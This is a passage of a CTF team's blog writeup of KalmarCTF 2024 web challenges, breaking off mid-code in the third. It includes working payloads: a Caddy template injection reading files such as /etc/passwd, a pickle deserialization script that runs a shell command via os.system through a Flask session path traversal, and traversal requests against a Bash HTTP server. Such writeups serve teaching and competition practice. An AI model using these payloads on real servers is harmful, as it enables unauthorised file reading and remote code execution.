<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="KalmarCTF 2024 Web Challenges" /><meta name="author" content="m0z, gg0h" /><meta property="og:locale" content="en" /><meta name="description" content="Writeups These are the web challenges our team solved at KalmarCTF 2024!" /><meta property="og:description" content="Writeups These are the web challenges our team solved at KalmarCTF 2024!" /><link rel="canonical" href="https://ireland.re/posts/KalmarCTF_2024/" /><meta property="og:url" content="https://ireland.re/posts/KalmarCTF_2024/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-03-17T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="KalmarCTF 2024 Web Challenges" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@m0z, gg0h" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m0z, gg0h"},"dateModified":"2024-03-17T17:07:52+00:00","datePublished":"2024-03-17T00:00:00+00:00","description":"Writeups These are the web challenges our team solved at KalmarCTF 2024!","headline":"KalmarCTF 2024 Web Challenges","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/KalmarCTF_2024/"},"url":"https://ireland.re/posts/KalmarCTF_2024/"}</script><title>KalmarCTF 2024 Web Challenges | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>KalmarCTF 2024 Web Challenges</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>KalmarCTF 2024 Web Challenges</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1710633600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-03-17 </em> </span> <span> Updated <em class="timeago" data-ts="1710695272" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-03-17 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2618 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><h2 id="writeups"><span class="mr-2">Writeups</span><a href="#writeups" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>These are the web challenges our team solved at KalmarCTF 2024!</p><h2 id="webez--v2"><span class="mr-2">web/Ez ⛳ v2</span><a href="#webez--v2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was a throwback to last year’s KalmarCTF where there was a similar challenge. I don’t exactly remember the details (I’m sure you can find some writeups online) but it was based on Caddy and that stuck in my mind.</p><p>Downloading the source, we see there is only really a <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> and a <code class="language-plaintext highlighter-rouge">Caddyfile</code> which is pretty unusual for a web challenge so I instantly knew it would be an issue with the Caddy configuration. What caught my eye was the following two routes:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>ua.caddy.chal-kalmarc.tf {
tls internal
templates
import html_reply `User-Agent: {{.Req.Header.Get  "User-Agent"}}`
}

http.caddy.chal-kalmarc.tf {
tls internal
templates
import html_reply "You are connected with {http.request.proto} ({tls_version}, {tls_cipher})."
}
</pre></table></code></div></div><p>This is strange! They are using two different approaches to rendering user-supplied variables. The latter looks far more standardized. This made me think there might be some potential for a template injection and so I tried <code class="language-plaintext highlighter-rouge">{{7*7}}</code> in my user agent and was greeted with a 500 Internal Server Error. Okay, that is weird! I next tried <code class="language-plaintext highlighter-rouge">{{7}}</code> and it was rendered as <code class="language-plaintext highlighter-rouge">7</code>. I’m still not 100% sure at this point if we have a template injection and so I tried the same template they used: <code class="language-plaintext highlighter-rouge">{{.Req.Header.Get "User-Agent"}}</code> but it sadly didn’t work and was printed as text. Then it hit me! I’m trying to read the user agent header so it’s obviously going to show me my own payload. I change it to instead read <code class="language-plaintext highlighter-rouge">Accept</code> =&gt; <code class="language-plaintext highlighter-rouge">{{.Req.Header.Get "Accept"}}</code> and it worked!</p><p>Okay, so we have a template injection here but what can we actually do? Thankfully I came across a really helpful resource: https://caddyserver.com/docs/modules/http.handlers.templates</p><p>This contains, as far as I can tell, everything we can do with templates in Caddy. I went through the list line by line trying each directive. Using both <code class="language-plaintext highlighter-rouge">include</code> and <code class="language-plaintext highlighter-rouge">readFile</code> we can achieve local file disclosure on any file on the server:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{{readFile "/etc/passwd"}}
</pre></table></code></div></div><p>But this isn’t sufficient because our <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> renames the file to a random value:</p><pre><code class="language-docker-compose">- ./flag:/wpqdDNHnYu8MZeclmpCr9Q:ro  # FILE WILL BE RENAMED TO SOMETHING SIMILAR RANDOM ON PROD
</code></pre><p>So we need a way to list the files. The same link I provided has a <code class="language-plaintext highlighter-rouge">listFiles</code> directive near the bottom. Listing the root directory we are able to see: <code class="language-plaintext highlighter-rouge">CVGjuzCIVR99QNpJTLtBn9</code> and reading this file we get our flag:</p><p><code class="language-plaintext highlighter-rouge">kalmar{Y0_d4wg_I_h3rd_y0u_l1k3_templates_s0_I_put_4n_template_1n_y0ur_template_s0_y0u_c4n_readFile_wh1le_y0u_executeTemplate}</code></p><p>I just missed the first blood on this by about 5 minutes which was sad but I’ll be faster next time! :D</p><h2 id="webfile-store"><span class="mr-2">web/File Store</span><a href="#webfile-store" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This one was pretty similar to a memcache RCE on HTB a few days ago affecting flask sessions. So, this was pretty fresh on my mind.</p><p>Downloading the source, we see it’s pretty bare and most of the logic is contained in the <code class="language-plaintext highlighter-rouge">app.py</code> file. It’s also a single route which doesn’t really do much but allows you to upload your own files.</p><p>The path traversal here is pretty obvious: <code class="language-plaintext highlighter-rouge">path = f'static/uploads/{session.sid}'</code> although they have a block on filenames containing <code class="language-plaintext highlighter-rouge">..</code> this block is not applied to session id’s which in Flask are completely user-controlled! What is also interesting here is that the <code class="language-plaintext highlighter-rouge">SESSION_TYPE</code> is set to <code class="language-plaintext highlighter-rouge">filename</code> which is something I have seen on a few challenges before.</p><p>Setting a flask session to <code class="language-plaintext highlighter-rouge">filename</code> means that session files are saved on the server as files. How do we save them? Well, using Pickle serialization of course! What’s crazy about this is that Pickle is considered <em>dangerous</em> and if you unpickle a user-controlled value it is essentially game over.</p><p>The Dockerfile also contains: <code class="language-plaintext highlighter-rouge">RUN chmod 777 static/uploads flask_session</code> which is a pretty major hint that we are going to need to use this directory traversal to overwrite values in the <code class="language-plaintext highlighter-rouge">flask_session</code> directory.</p><p>In a normal situation you may think to overwrite <code class="language-plaintext highlighter-rouge">app.py</code> or perhaps <code class="language-plaintext highlighter-rouge">templates/index.html</code> which are both decent approaches depending on the circumstances but these files are not writable here.</p><p>When creating a Pickle deserialized value, I very much recommend using the docker file provided. This allows you to generate a payload on a server running the same setup and makes it more likely your pickled object contains the correct references to the modules which exist. You <em>will</em> notice issues if you create your payload on different operating systems and possibly different architectures.</p><p>My idea was to create a payload that would run <code class="language-plaintext highlighter-rouge">cp /flag.txt /app/static/uploads/abcd.txt</code> and that way I could see the file in the uploads directory! For these flask sessions there are a few things to note but most importantly you must reserve the first 4 bytes (doesn’t really matter why, just pad it with nullbytes) and when attempting to access a session (to deserialize it) Flask will search for a session called which is a hash of your session cookie. I had read online that it was md5 but from testing locally that was not the case for me and I was not bothered looking through the module source. If you know the algorithm used please let me know!</p><p>So, I set my cookie to <code class="language-plaintext highlighter-rouge">xxx</code> and uploaded a file on my local instance. This revealed that <code class="language-plaintext highlighter-rouge">xxx</code> mapped to <code class="language-plaintext highlighter-rouge">254b2716336df2553ce5c04a934d56e4</code> so we can use this as the name for our serialized Pickle object. We will upload the output of the following script to <code class="language-plaintext highlighter-rouge">/app/flask_session/254b2716336df2553ce5c04a934d56e4</code> here:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">class</span> <span class="nc">RCE</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="p">(</span><span class="s">'cp /flag.txt /app/static/uploads/abcd.txt'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,)</span>

<span class="k">def</span> <span class="nf">generate_exploit</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">payload</span>


<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"254b2716336df2553ce5c04a934d56e4"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">generate_exploit</span><span class="p">())</span>
</pre></table></code></div></div><p>Next, I set my session cookie to <code class="language-plaintext highlighter-rouge">../../flask_session</code> and uploaded the file. This overwrote the session.</p><p>Then I set my session to <code class="language-plaintext highlighter-rouge">xxx</code> and refreshed the page. Lastly, I visited <code class="language-plaintext highlighter-rouge">/static/uploads/abcd.txt</code> path and got the flag!</p><p><code class="language-plaintext highlighter-rouge">kalmar{still_p1ckling_away_in_2024}</code></p><h2 id="webbadass-server-for-hypertext"><span class="mr-2">Web/BadAss Server for Hypertext</span><a href="#webbadass-server-for-hypertext" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was a sourceless web (ew) but was surprisingly fun and insightful! I guess sourceless web isn’t all bad after all. :P</p><p>I pretty quickly found that the 404 error page was showing the output of a <code class="language-plaintext highlighter-rouge">cat</code> command which indicated that we were dealing with a server that was piping all paths into <code class="language-plaintext highlighter-rouge">cat</code> and displaying the result! We can easily read local files using this…</p><p><code class="language-plaintext highlighter-rouge">GET /../../etc/passwd</code> confirmed the worst fears of LFD!!</p><p>The next step is to make this <strong>not</strong> a sourceless web challenge. One of my teammates (gg0h) tried out <code class="language-plaintext highlighter-rouge">/proc/1/cmdline</code> and found the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>socatTCP4-LISTEN:8080,reuseaddr,forkEXEC:/app/badass_server.sh
</pre></table></code></div></div><p>From this he was able to read <code class="language-plaintext highlighter-rouge">/app/badass_server.sh</code> which contained the following:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># I hope there are no bugs in this source code...</span>

<span class="nb">set</span> <span class="nt">-e</span>

<span class="nb">declare</span> <span class="nt">-A</span> request_headers
<span class="nb">declare</span> <span class="nt">-A</span> response_headers
<span class="nb">declare </span>method
<span class="nb">declare </span>uri
<span class="nb">declare </span>protocol
<span class="nb">declare </span>request_body
<span class="nb">declare </span><span class="nv">status</span><span class="o">=</span><span class="s2">"200 OK"</span>

abort<span class="o">()</span> <span class="o">{</span>
	<span class="nb">declare</span> <span class="nt">-gA</span> response_headers
	<span class="nv">status</span><span class="o">=</span><span class="s2">"400 Bad Request"</span>
	write_headers
	<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="k">${</span><span class="nv">1</span><span class="p">+x</span><span class="k">}</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
		<span class="o">&gt;</span>&amp;2 <span class="nb">echo</span> <span class="s2">"Request aborted: </span><span class="nv">$1</span><span class="s2">"</span>
		<span class="nb">echo</span> <span class="nt">-en</span> <span class="nv">$1</span>
	<span class="k">fi
	</span><span class="nb">exit </span>1
<span class="o">}</span>

write_headers<span class="o">()</span> <span class="o">{</span>
	response_headers[<span class="s1">'Connection'</span><span class="o">]=</span><span class="s1">'close'</span>
	response_headers[<span class="s1">'X-Powered-By'</span><span class="o">]=</span><span class="s1">'Bash'</span>

	<span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"HTTP/1.0 </span><span class="nv">$status</span><span class="se">\r\n</span><span class="s2">"</span>

	<span class="k">for </span>key <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="p">!response_headers[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
		</span><span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"</span><span class="k">${</span><span class="nv">key</span><span class="k">}</span><span class="s2">: </span><span class="k">${</span><span class="nv">response_headers</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span><span class="k">}</span><span class="se">\r\n</span><span class="s2">"</span>
	<span class="k">done

	</span><span class="nb">echo</span> <span class="nt">-en</span> <span class="s1">'\r\n'</span>

	<span class="o">&gt;</span>&amp;2 <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span> <span class="nt">-u</span> +<span class="s1">'%Y-%m-%dT%H:%M:%SZ'</span><span class="si">)</span><span class="s2"> </span><span class="nv">$SOCAT_PEERADDR</span><span class="s2"> </span><span class="nv">$method</span><span class="s2"> </span><span class="nv">$uri</span><span class="s2"> </span><span class="nv">$protocol</span><span class="s2"> -&gt; </span><span class="nv">$status</span><span class="s2">"</span>
<span class="o">}</span>

receive_request<span class="o">()</span> <span class="o">{</span>
	<span class="nb">read</span> <span class="nt">-d</span> <span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span> <span class="nt">-a</span> request_line

	<span class="k">if</span> <span class="o">[</span> <span class="k">${#</span><span class="nv">request_line</span><span class="p">[@]</span><span class="k">}</span> <span class="o">!=</span> 3 <span class="o">]</span><span class="p">;</span> <span class="k">then
		</span>abort <span class="s2">"Invalid request line"</span>
	<span class="k">fi

	</span><span class="nv">method</span><span class="o">=</span><span class="k">${</span><span class="nv">request_line</span><span class="p">[0]</span><span class="k">}</span>

	<span class="nv">uri</span><span class="o">=</span><span class="k">${</span><span class="nv">request_line</span><span class="p">[1]</span><span class="k">}</span>

	<span class="nv">protocol</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="k">${</span><span class="nv">request_line</span><span class="p">[2]</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="s1">'s/^\s*//g'</span> | <span class="nb">sed</span> <span class="s1">'s/\s*$//g'</span><span class="si">)</span>

	<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$method</span> <span class="o">=</span>~ ^<span class="o">(</span>GET|HEAD<span class="o">)</span><span class="nv">$ </span><span class="o">]]</span><span class="p">;</span> <span class="k">then
		</span>abort <span class="s2">"Invalid request method"</span>
	<span class="k">fi

	if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$uri</span> <span class="o">=</span>~ ^/ <span class="o">]]</span><span class="p">;</span> <span class="k">then
		</span>abort <span class="s1">'Invalid URI'</span>
	<span class="k">fi

	if</span> <span class="o">[</span> <span class="nv">$protocol</span> <span class="o">!=</span> <span class="s1">'HTTP/1.0'</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> <span class="nv">$protocol</span> <span class="o">!=</span> <span class="s1">'HTTP/1.1'</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
		</span>abort <span class="s1">'Invalid protocol'</span>
	<span class="k">fi

	while </span><span class="nb">read</span> <span class="nt">-d</span> <span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span> header<span class="p">;</span> <span class="k">do
		</span><span class="nv">stripped_header</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$header</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="s1">'s/^\s*//g'</span> | <span class="nb">sed</span> <span class="s1">'s/\s*$//g'</span><span class="si">)</span>

		<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$stripped_header</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
			</span><span class="nb">break</span><span class="p">;</span>
		<span class="k">fi

		</span><span class="nv">header_name</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$header</span><span class="s2">"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">':'</span> <span class="nt">-f</span> 1 | <span class="nb">sed</span> <span class="s1">'s/^\s*//g'</span> | <span class="nb">sed</span> <span class="s1">'s/\s*$//g'</span> | <span class="nb">tr</span> <span class="s1">'[:upper:]'</span> <span class="s1">'[:lower:]'</span><span class="si">)</span><span class="p">;</span>
		<span class="nv">header_value</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$header</span><span class="s2">"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">':'</span> <span class="nt">-f</span> 2- | <span class="nb">sed</span> <span class="s1">'s/^\s*//g'</span> | <span class="nb">sed</span> <span class="s1">'s/\s*$//g'</span><span class="si">)</span><span class="p">;</span>

		<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$header_name</span><span class="s2">"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$header_name</span><span class="s2">"</span> <span class="o">=</span>~ <span class="o">[[</span>:space:]] <span class="o">]]</span><span class="p">;</span> <span class="k">then
			</span>abort <span class="s2">"Invalid header name"</span><span class="p">;</span>
		<span class="k">fi</span>

		<span class="c"># If header already exists, add value to comma separated list</span>
		<span class="k">if</span> <span class="o">[[</span> <span class="nt">-v</span> request_headers[<span class="nv">$header_name</span><span class="o">]</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
			</span>request_headers[<span class="nv">$header_name</span><span class="o">]=</span><span class="s2">"</span><span class="k">${</span><span class="nv">request_headers</span><span class="p">[</span><span class="nv">$header_name</span><span class="p">]</span><span class="k">}</span><span class="s2">, </span><span class="nv">$header_value</span><span class="s2">"</span>
		<span class="k">else
			</span>request_headers[<span class="nv">$header_name</span><span class="o">]=</span><span class="s2">"</span><span class="nv">$header_value</span><span class="s2">"</span>
		<span class="k">fi
	done

	</span><span class="nv">body_length</span><span class="o">=</span><span class="k">${</span><span class="nv">request_headers</span><span class="p">[</span><span class="s2">"content-length"</span><span class="p">]</span><span class="k">:-</span><span class="nv">0</span><span class="k">}</span>

	<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$body_length</span> <span class="o">=</span>~ ^[0-9]+<span class="nv">$ </span><span class="o">]]</span><span class="p">;</span> <span class="k">then
		</span>abort <span class="s2">"Invalid Content-Length"</span>
	<span class="k">fi

	</span><span class="nb">read</span> <span class="nt">-N</span> <span class="nv">$body_length</span> request_body
<span class="o">}</span>

handle_request<span class="o">()</span> <span class="o">{</span>
	<span class="c"># Default: serve from static directory</span>
	<span class="nv">path</span><span class="o">=</span><span class="s2">"/app/static</span><span class="nv">$uri</span><span class="s2">"</span>
	<span class="nv">path_last_character</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span> | <span class="nb">tail</span> <span class="nt">-c</span> 1<span class="si">)</span>

	<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$path_last_character</span><span class="s2">"</span> <span class="o">==</span> <span class="s1">'/'</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
		</span><span class="nv">path</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">path</span><span class="k">}</span><span class="s2">index.html"</span>
	<span class="k">fi

	if</span> <span class="o">!</span> <span class="nb">cat</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span> <span class="o">&gt;</span> /dev/null<span class="p">;</span> <span class="k">then
		</span><span class="nv">status</span><span class="o">=</span><span class="s2">"404 Not Found"</span>
	<span class="k">else
		</span><span class="nv">mime_type</span><span class="o">=</span><span class="si">$(</span>file <span class="nt">--mime-type</span> <span class="nt">-b</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span><span class="si">)</span>
		<span class="nv">file_size</span><span class="o">=</span><span class="si">$(</span><span class="nb">stat</span> <span class="nt">--printf</span><span class="o">=</span><span class="s2">"%s"</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span><span class="si">)</span>

		response_headers[<span class="s2">"Content-Type"</span><span class="o">]=</span><span class="s2">"</span><span class="nv">$mime_type</span><span class="s2">"</span>
		response_headers[<span class="s2">"Content-Length"</span><span class="o">]=</span><span class="s2">"</span><span class="nv">$file_size</span><span class="s2">"</span>
	<span class="k">fi

	</span>write_headers

	<span class="nb">cat</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span> 2&gt;&amp;1
<span class="o">}</span>

receive_request
handle_request
</pre></table></code></div></div><p>Now came the sourced part. We tried a lot of different approaches and I thought I had RCE through overflowing the <code class="language-plaintext highlighter-rouge">read</code> directive but that only worked in my terminal. :(</p><p>Eventually another one of our players (Protag) came on and mentioned the possibilities of globbing and word splitting. I have to admit, I was not too familiar with this concept except for a few bash jails I have done before.</p><p>I noticed the following logic:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">if</span>  <span class="o">[</span>  <span class="nv">$protocol</span>  <span class="o">!=</span>  <span class="s1">'HTTP/1.0'</span>  <span class="o">]</span>  <span class="o">&amp;&amp;</span>  <span class="o">[</span>  <span class="nv">$protocol</span>  <span class="o">!=</span>  <span class="s1">'HTTP/1.1'</span>  <span class="o">]</span><span class="p">;</span>  <span class="k">then </span>abort <span class="s1">'Invalid protocol'</span>  <span class="k">fi</span>
</pre></table></code></div></div><p>This has some unquoted variables and may allow us to glob the <code class="language-plaintext highlighter-rouge">$protocol</code> value. I tried a basic test:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GET /whatever /app/static/assets/f*
